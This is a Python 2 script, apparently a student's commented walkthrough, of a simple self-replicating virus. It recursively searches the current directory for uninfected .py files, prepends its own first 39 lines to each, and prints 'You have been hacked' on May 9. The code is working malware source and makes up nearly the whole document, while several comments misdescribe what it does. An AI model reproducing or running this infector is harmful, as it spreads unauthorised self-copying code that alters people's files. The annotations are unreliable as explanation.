#!/usr/bin/python
# The two following commands import python libraries "os" and "datetime":
import os
import datetime
# This is declaring the variable "SIGNATURE"
SIGNATURE = "VIRUS"
# This is defining a function that appears to return a list of files in a directory and checks if the path is an existing directory or not. If it is then the function will
# add the specified elements to the end of the targeted files. Else/if the file is not infected then function will open a file object and
# if the variable "SIGNATURE" exist the files are infected and the function stops. If the files are not infected the function will append a file path to the targeted files
# and then terminates the function and returns the value of file_targeted.
def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted
# This is defining a function that calls the variable "files_targeted" and sets "virus" to open a file object path. It will then add a counter to the file and if "i,line" in the
# file is less than or equal to 0 and less than 39 it will the virusstring to the line and then closes virus file object. Then for the file name in "files_targeted" f will open
# the file and temp will read the file and then close and then open the file with in write and then will write the virusstring to the file and then close the file.
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
# This is defining a function "detonate" that if the date is May 9 print to the screen "You have been hacked"
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print "You have been hacked"
# This is setting the variable files_targeted to the locate the file object path.
files_targeted = locate(os.path.abspath(""))
# This is calling the function "infect(files_targeted"
infect(files_targeted)
# This is calling the function "detonate". Overall it appears thet this script locates files in a directory and adds a virus to each line and then when it is a particular date
# it will print to the screen that you have been hacked.
detonate()
